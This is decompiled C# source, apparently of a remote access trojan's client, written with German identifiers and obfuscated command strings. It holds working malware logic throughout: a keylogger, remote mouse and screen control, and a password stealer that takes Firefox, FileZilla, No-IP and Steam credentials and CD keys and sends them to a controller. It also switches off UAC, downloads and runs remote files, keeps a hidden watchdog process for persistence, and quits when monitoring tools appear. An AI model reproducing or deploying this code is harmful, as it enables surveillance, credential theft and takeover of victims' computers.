      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Iťɡͤѭ\u0557٭ݤ\u086Aॵ"), false) == 0)
      {
        try
        {
          int integer1 = Conversions.ToInteger(Befehle[1]);
          int integer2 = Conversions.ToInteger(Befehle[2]);
          Cursor.Position = new Point(integer1, integer2);
          Module1.mouse_event(8, integer1, integer2, 0, 0);
          Module1.mouse_event(16, integer1, integer2, 0, 0);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Cŧɡͺџբ٤ݮ\u086D६\u0A55୦\u0C76൦\u0E67\u0F6F"), false) == 0)
      {
        try
        {
          Module2.VictimID = Befehle[1];
          new Module1.ShowSingelScreen().Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("]Źɭ\u0379ѾՂ٭ݾ\u086A४\u0A63\u0B64౧\u0D73"), false) == 0)
      {
        try
        {
          if (Module2.OffKeylogger)
            this.OfKeylogger.Stopp();
          this.Keylogger.Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("]ŹɣͻѺՂ٭ݾ\u086A४\u0A63\u0B64౧\u0D73"), false) == 0)
      {
        if (Module2.OffKeylogger)
          this.OfKeylogger.Start();
        this.Keylogger.Stopp();
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Yũɴ͵Ѳիٱݶ\u0864"), false) == 0)
      {
        try
        {
          this.Client.Senden(Conversions.ToString(Operators.ConcatenateObject((object) (Conversions.ToString(Operators.ConcatenateObject((object) (\u003F0\u003F.\u003F1\u003F("]ŭɸ\u0379Ѿէٵݲ\u0860धਨ\u0B29ఢ") + this.Passwortstealer.CD_SerialKeys()), this.Passwortstealer.SteamUserNamenStealen())) + this.Passwortstealer.FileZilla_Stealen() + this.Passwortstealer.NO_IP_Stealen()), this.Passwortstealer.GetFireFoxPWs())));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("KŤɷͰђՖ"), false) == 0)
      {
        try
        {
          this.Client.Senden(Conversions.ToString(Operators.ConcatenateObject((object) (Conversions.ToString(Operators.ConcatenateObject((object) (\u003F0\u003F.\u003F1\u003F("GŨɻʹіՒاܨࠩढ") + this.Passwortstealer.CD_SerialKeys()), this.Passwortstealer.SteamUserNamenStealen())) + this.Passwortstealer.FileZilla_Stealen() + this.Passwortstealer.NO_IP_Stealen()), this.Passwortstealer.GetFireFoxPWs())));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("ZŏɎ͈Ѯի٢ݼ\u086E॰੬ୡ\u0C71൧\u0E6F"), false) == 0)
      {
        try
        {
          Module1.UAC_Deakrivieren(true);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("XōɈ͋Ѣռٮݰ\u086Cॡੱ୧౯"), false) == 0)
      {
        try
        {
          Module1.UAC_Deakrivieren(false);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("EŤɠͧхկٮݫ\u086F५\u0A61\u0B4F౭൦"), false) == 0)
      {
        try
        {
          MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("WŞɄ͘ЪՉكݏࡄॎਫ਼") + Befehle[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("IŨɸ̈́Ѭկ٤ݮ\u0868ॠੈ୬\u0C65\u0D72"), false) == 0)
      {
        try
        {
          string Text = \u003F0\u003F.\u003F1\u003F("@Ũɫ͠Ѣդ٬݄\u0868ॡ\u0A76ଧనഩย");
          try
          {
            foreach (string file in MyProject.Computer.FileSystem.GetFiles(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ"))))
            {
              if (file.Contains(\u003F0\u003F.\u003F1\u003F("]Ņɗ̫ъՂو݅ࡍ")))
              {
                FileInfo fileInfo = new FileInfo(file);
                Text = Text + Strings.Split(fileInfo.Name, \u003F0\u003F.\u003F1\u003F("^"))[1] + \u003F0\u003F.\u003F1\u003F("8ĸȺ") + fileInfo.Length.ToString() + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
              }
            }
          }
          finally
          {
            IEnumerator<string> enumerator;
            enumerator?.Dispose();
          }
          this.Client.Senden(Text);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("MŬɼ͓Ѯլٷݏ\u086D०"), false) == 0)
      {
        try
        {
          string str = Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("WŞɄ͘ЪՉكݏࡄॎਫ਼") + Befehle[1];
          Module1.Logsender logsender = new Module1.Logsender();
          logsender.VonHier = str;
          Module2.VictimID = Befehle[2];
          logsender.Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("[ŽɨͪѾլَݵ\u0869२ੂ୪౮\u0D64"), false) == 0)
      {
        try
        {
          if (MyProject.Computer.FileSystem.FileExists(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("VűɰͲѶաتݦ\u087A।")))
            MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("VűɰͲѶաتݦ\u087A।"));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          Module1.FileGetter fileGetter = new Module1.FileGetter();
          Module2.VictimID = Befehle[3];
          fileGetter.vonhier = Befehle[1];
          fileGetter.nachhier = Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("VűɰͲѶաتݦ\u087A।");
          fileGetter.GetUpdatedServerFromServer();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("UţɶͰѢհٵ"), false) == 0)
      {
        try
        {
          this.m.Close();
          this.m = (Mutex) null;
          Application.Restart();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Dźɬͦѐգ٧ݷ\u086Aॶ\u0A64"), false) == 0)
      {
        try
        {
          Process.Start(Befehle[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("LŨɱͫѨլ٣ݥ"), false) == 0)
      {
        try
        {
          string str3 = Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ"));
          Befehle[1] = Befehle[1].Replace(\u003F0\u003F.\u003F1\u003F("]"), \u003F0\u003F.\u003F1\u003F("."));
          string str4 = Strings.Split(Befehle[1], \u003F0\u003F.\u003F1\u003F("."))[checked ((int) ((long) Strings.Split(Befehle[1], \u003F0\u003F.\u003F1\u003F(".")).Length - 1L))];
          if (Operators.CompareString(Befehle[2], \u003F0\u003F.\u003F1\u003F("hŠ"), false) == 0)
          {
            MyProject.Computer.Network.DownloadFile(Befehle[1], str3 + \u003F0\u003F.\u003F1\u003F("]") + str4);
            Process.Start(str3 + \u003F0\u003F.\u003F1\u003F("]") + str4);
          }
          else
            MyProject.Computer.Network.DownloadFile(Befehle[1], str3 + \u003F0\u003F.\u003F1\u003F("]") + str4);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Lůɽ͛Ѣմٳݭ\u0860१ੲ"), false) == 0)
      {
        try
        {
          this.Client.Senden(\u003F0\u003F.\u003F1\u003F("_ŮɸͿѡդ٣ݶࠧन\u0A29ଢ") + this.GetServices());
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("]Ũɾͽѣժ٭݅\u0863ॠ੪୧౧൯"), false) == 0)
      {
        try
        {
          ServiceController[] services = ServiceController.GetServices(MyProject.Computer.Name);
          int index = 0;
          while (index < services.Length)
          {
            ServiceController serviceController = services[index];
            if (Operators.CompareString(serviceController.ServiceName, Befehle[1], false) == 0)
              serviceController.Close();
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("]Ũɾͽѣժ٭ݔ\u0872४ੴ\u0B73౧൯"), false) == 0)
      {
        try
        {
          ServiceController[] services = ServiceController.GetServices(MyProject.Computer.Name);
          int index = 0;
          while (index < services.Length)
          {
            ServiceController serviceController = services[index];
            if (Operators.CompareString(serviceController.ServiceName, Befehle[1], false) == 0)
              serviceController.Stop();
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("]Ũɾͽѣժ٭ݔ\u0872।\u0A76\u0B77౧൯"), false) != 0)
        return;
      try
      {
        ServiceController[] services = ServiceController.GetServices(MyProject.Computer.Name);
        int index = 0;
        while (index < services.Length)
        {
          ServiceController serviceController = services[index];
          if (Operators.CompareString(serviceController.ServiceName, Befehle[1], false) == 0)
            serviceController.Continue();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Client_OnConnect()
    {
      try
      {
        this.Client.Senden(this.ErsterString());
        this.AktuellesFenster.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private string GetServices()
    {
label_0:
      int num1;
      string str1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        string str2 = (string) null;
label_2:
        num3 = 3;
        ServiceController[] services = ServiceController.GetServices(MyProject.Computer.Name);
label_3:
        num3 = 4;
        ServiceController[] serviceControllerArray = services;
        int index = 0;
        goto label_23;
label_5:
        num3 = 5;
        ServiceController serviceController;
        str2 = str2 + serviceController.ServiceName + \u003F0\u003F.\u003F1\u003F("8ĸȺ");
label_6:
        num3 = 6;
        str2 = str2 + serviceController.DisplayName + \u003F0\u003F.\u003F1\u003F("8ĸȺ");
label_7:
        num3 = 7;
        if (serviceController.Status != ServiceControllerStatus.Paused)
          goto label_9;
label_8:
        num3 = 8;
        str2 += \u003F0\u003F.\u003F1\u003F("Yũɲ͵Ѡ\u0560ظܸ࠺");
label_9:
        num3 = 10;
        if (serviceController.Status != ServiceControllerStatus.Running)
          goto label_11;
label_10:
        num3 = 11;
        str2 += \u003F0\u003F.\u003F1\u003F("Xżɦͩѯի٣ܸ࠸ऺ");
label_11:
        num3 = 13;
        if (serviceController.Status != ServiceControllerStatus.Stopped)
          goto label_13;
label_12:
        num3 = 14;
        str2 += \u003F0\u003F.\u003F1\u003F("YŽɧͷѶ\u0560٠ܸ࠸ऺ");
label_13:
        num3 = 16;
        if (serviceController.Status != ServiceControllerStatus.PausePending)
          goto label_15;
label_14:
        num3 = 17;
        str2 += \u003F0\u003F.\u003F1\u003F("_ůɸͿѮ՚٬ݦ\u0863९੫ୣసസฺ");
label_15:
        num3 = 19;
        if (serviceController.Status != ServiceControllerStatus.ContinuePending)
          goto label_17;
label_16:
        num3 = 20;
        str2 += \u003F0\u003F.\u003F1\u003F("Qžɾͻѧգٹݮ࡚६੦ୣ౯൫\u0E63༸းᄺ");
label_17:
        num3 = 22;
        if (serviceController.Status != ServiceControllerStatus.StartPending)
          goto label_19;
label_18:
        num3 = 23;
        str2 += \u003F0\u003F.\u003F1\u003F("\\źɬ;ѿ՚٬ݦ\u0863९੫ୣసസฺ");
label_19:
        num3 = 25;
        if (serviceController.Status != ServiceControllerStatus.StopPending)
          goto label_21;
label_20:
        num3 = 26;
        str2 += \u003F0\u003F.\u003F1\u003F("]Źɣͻњլ٦ݣ\u086F५\u0A63ସసഺ");
label_21:
        num3 = 28;
        str2 += \u003F0\u003F.\u003F1\u003F("}ĩɿ");
        checked { ++index; }
label_22:
        num3 = 29;
label_23:
        if (index < serviceControllerArray.Length)
        {
          serviceController = serviceControllerArray[index];
          goto label_5;
        }
label_24:
        str1 = str2;
        goto label_31;
label_26:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
              case 13:
                goto label_11;
              case 14:
                goto label_12;
              case 15:
              case 16:
                goto label_13;
              case 17:
                goto label_14;
              case 18:
              case 19:
                goto label_15;
              case 20:
                goto label_16;
              case 21:
              case 22:
                goto label_17;
              case 23:
                goto label_18;
              case 24:
              case 25:
                goto label_19;
              case 26:
                goto label_20;
              case 27:
              case 28:
                goto label_21;
              case 29:
                goto label_22;
              case 30:
                goto label_24;
              case 31:
                goto label_31;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_26;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_31:
      string services1 = str1;
      if (num2 == 0)
        return services1;
      ProjectData.ClearProjectError();
      return services1;
    }

    private string ErsterString()
    {
label_0:
      int num1;
      string str1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        int width = Screen.PrimaryScreen.Bounds.Width;
label_2:
        num3 = 3;
        int height = Screen.PrimaryScreen.Bounds.Height;
label_3:
        num3 = 4;
        string str2 = MyProject.User.Name + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
label_4:
        num3 = 5;
        str2 = str2 + Module1.Getcn.GetLetters().ToString() + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
label_5:
        num3 = 6;
        str2 = str2 + Module1.Getcn.GetLetters().ToString() + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
label_6:
        num3 = 7;
        str2 = str2 + MyProject.Computer.Info.OSFullName + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
label_7:
        num3 = 8;
        str2 = str2 + this.AktuellesFenster.GetActiveWindowTitle() + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
label_8:
        num3 = 9;
        str2 = str2 + Module2.VictimName + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
label_9:
        num3 = 10;
        str2 = str2 + width.ToString() + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + height.ToString() + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
label_10:
        num3 = 11;
        str2 = str2 + Module2.ServerVersion + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
label_11:
        num3 = 12;
        if (!Module2.OffKeylogger)
          goto label_13;
label_12:
        num3 = 13;
        str2 += \u003F0\u003F.\u003F1\u003F("LŤą̇ЩԢ");
        goto label_15;
label_13:
        num3 = 15;
label_14:
        num3 = 16;
        str2 += \u003F0\u003F.\u003F1\u003F("FŢɯͫЧԨةܢ");
label_15:
        num3 = 18;
        if (!this.RemoteWebcam.WebcamPrüfen())
          goto label_17;
label_16:
        num3 = 19;
        str2 += \u003F0\u003F.\u003F1\u003F("LŤą̇ЩԢ");
        goto label_19;
label_17:
        num3 = 21;
label_18:
        num3 = 22;
        str2 += \u003F0\u003F.\u003F1\u003F("FŢɯͫЧԨةܢ");
label_19:
        num3 = 24;
        str2 = str2 + Syn.DDOSStatus + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
label_20:
        num3 = 25;
        str2 = str2 + Module2.Passwort + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
label_21:
        num3 = 26;
        str2 = str2 + Module1.GetAntivirus() + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
label_22:
        num3 = 27;
        str2 = str2 + MySettingsProperty.Settings.VictimNotiz + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
label_23:
        str1 = str2;
        goto label_30;
label_25:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
              case 17:
              case 18:
                goto label_15;
              case 15:
                goto label_13;
              case 16:
                goto label_14;
              case 19:
                goto label_16;
              case 20:
              case 23:
              case 24:
                goto label_19;
              case 21:
                goto label_17;
              case 22:
                goto label_18;
              case 25:
                goto label_20;
              case 26:
                goto label_21;
              case 27:
                goto label_22;
              case 28:
                goto label_23;
              case 29:
                goto label_30;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_25;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_30:
      string str3 = str1;
      if (num2 == 0)
        return str3;
      ProjectData.ClearProjectError();
      return str3;
    }

    private void Client_OnReconnect()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        this.Keylogger.Stopp();
label_2:
        num3 = 3;
        this.AktuellesFenster.Stopp();
label_3:
        num3 = 4;
        this.RemoteWebcam.Stopp();
label_4:
        num3 = 5;
        this.RemoteDesktop.Stopp();
        goto label_11;
label_6:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_11;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void ShellKonsole_ShellAnswer(string sText)
    {
      try
      {
        this.Client.Senden(\u003F0\u003F.\u003F1\u003F("^Ťɮͦѥ՜٢ݾ\u0871धਨ\u0B29ఢ") + sText);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Keylogger_NewOnlineKeyLoggs(string sText)
    {
      try
      {
        this.Client.Senden(\u003F0\u003F.\u003F1\u003F("GŮɳͥѧ\u0560١ݶࠧन\u0A29ଢ") + sText);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DateiSuche_DateiGefunden(string Pfad, string DateiName, string Größe, string s)
    {
      try
      {
        this.Client.Senden(\u003F0\u003F.\u003F1\u003F("UűɻͫѤՋٮݬ\u087C०\u0A63ୣ౫ധศ༩ဢ") + Pfad + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + DateiName + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + Größe + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + s + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      if (!MyProject.Computer.FileSystem.FileExists(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("fŶɵ͠Ѣն٠")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ")))
      {
        try
        {
          Module1.VbCompile(this.TextBox1.Text.Replace(\u003F0\u003F.\u003F1\u003F("-šɩ͵ѱեٯݮࠥ"), Interaction.Environ(Module2.InstallationsOrdner) + \u003F0\u003F.\u003F1\u003F("PŘɼͪѠըٵݱࠪॡ\u0A63\u0B75")), \u003F0\u003F.\u003F1\u003F("IŢɫͯ"), Interaction.Environ(\u003F0\u003F.\u003F1\u003F("fŶɵ͠Ѣն٠")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
          Microsoft.VisualBasic.FileSystem.SetAttr(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("fŶɵ͠Ѣն٠")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"), FileAttribute.Hidden);
          Interaction.Shell(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("fŶɵ͠Ѣն٠")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"), AppWinStyle.Hide);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (!MyProject.Computer.FileSystem.FileExists(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ")))
      {
        try
        {
          Module1.VbCompile(this.TextBox1.Text.Replace(\u003F0\u003F.\u003F1\u003F("-šɩ͵ѱեٯݮࠥ"), Interaction.Environ(Module2.InstallationsOrdner) + \u003F0\u003F.\u003F1\u003F("PŘɼͪѠըٵݱࠪॡ\u0A63\u0B75")), \u003F0\u003F.\u003F1\u003F("IŢɫͯ"), Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
          Microsoft.VisualBasic.FileSystem.SetAttr(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"), FileAttribute.Hidden);
          Interaction.Shell(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"), AppWinStyle.Hide);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (this.Propzessvorhanden(\u003F0\u003F.\u003F1\u003F("vŲɹ")))
        return;
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
        MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("fŶɵ͠Ѣն٠")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private bool Propzessvorhanden(string name)
    {
      Process[] processesByName = Process.GetProcessesByName(name);
      int index = 0;
      if (index >= processesByName.Length)
        return false;
      Process process = processesByName[index];
      return true;
    }

    private void Socks5Manager_SendText(string sText) => this.Client.Senden(\u003F0\u003F.\u003F1\u003F("YŦɫͬѵ\u0530اܨࠩढ") + sText);

    private void Timer2_Tick(object sender, EventArgs e)
    {
      Process[] processes = Process.GetProcesses();
      int index1 = 0;
      while (index1 < processes.Length)
      {
        Process process = processes[index1];
        bool flag = false;
        if (process.MainWindowTitle.Contains(\u003F0\u003F.\u003F1\u003F("^šɵͣѶլ٢ݰ\u086A")))
          flag = true;
        if (process.MainWindowTitle.Contains(\u003F0\u003F.\u003F1\u003F("PŖɀ̤ѓՐَ")))
          flag = true;
        if (process.MainWindowTitle.Contains(\u003F0\u003F.\u003F1\u003F("HŪɩͽч\u0560٦")))
          flag = true;
        if (process.MainWindowTitle.Contains(\u003F0\u003F.\u003F1\u003F("YŤɩ͵ѲՖ٪ݪ\u0864१")))
          flag = true;
        if (flag)
        {
          this.Timer1.Stop();
          try
          {
            if (Module2.Persistenz)
            {
              try
              {
                Process[] processesByName = Process.GetProcessesByName(\u003F0\u003F.\u003F1\u003F("vŲɹ"));
                int index2 = 0;
                while (index2 < processesByName.Length)
                {
                  processesByName[index2].Kill();
                  checked { ++index2; }
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              try
              {
                MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("fŶɵ͠Ѣն٠")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              try
              {
                MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            this.Client.Deisconnect();
            Application.Exit();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        checked { ++index1; }
      }
    }

    private void FunFunktionen_ChatMSG(string sText) => this.Client.Senden(\u003F0\u003F.\u003F1\u003F("HŢɨͼъյ٢ܧࠨऩਢ") + sText);
  }
}
